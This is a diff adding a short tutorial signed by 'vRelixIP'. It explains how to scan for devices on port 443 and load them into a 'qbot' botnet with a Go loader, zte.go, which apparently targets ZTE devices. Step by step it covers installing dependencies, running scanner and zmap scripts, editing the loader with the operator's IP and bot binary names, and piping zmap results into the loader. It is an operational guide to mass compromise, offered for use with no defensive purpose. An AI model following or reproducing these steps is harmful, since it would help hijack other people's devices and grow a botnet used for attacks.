@@ -1,0 +1,42 @@
+TUTORIAL MADE BY: vRelixIP
+DISCORD: vRelixIP#0001
+
+
+1) Login to your vps via root access.
+
+2) Install these dependencies:
+                              yum install epel-release
+                              yum install perl
+                              yum install perl-CPAN -y
+                              yum install perl-Parallel-ForkManager
+                              yum install golang
+
+3) Install the scanner: sh Scanner.sh
+
+4) Install the zmap: sh zmap.sh
+
+5) Locate your botnet bins and keep in hand of the arch names of your bins.
+-To find your bins go into the html direcotry: /var/www/html/
+
+6) Drag the zte.go file into your vps.
+
+7) Go into the zte.go file and change your ip and bin arch name to your own and save the file.
+
+8) Now to build the file, run this command: 
+                                          go build zte.go
+
+9) Now drag a list you want to use, has to be a list thats got port 443.
+
+10) Now to load your bots to the qbot, run this command:
+                                                        chmod 777 *                  :you do this only once.
+                                                        ulimit -n 999999             :you do this only once.
+                                                        -----------------------------
+                                                        zmap -p443 -wyourlist | ./zte
+
+11) Now repeat these steps from step (9)
+
+There you go you have now finally scanned bots to your qbot botnet source...
+
+Enjoy :)
+
+
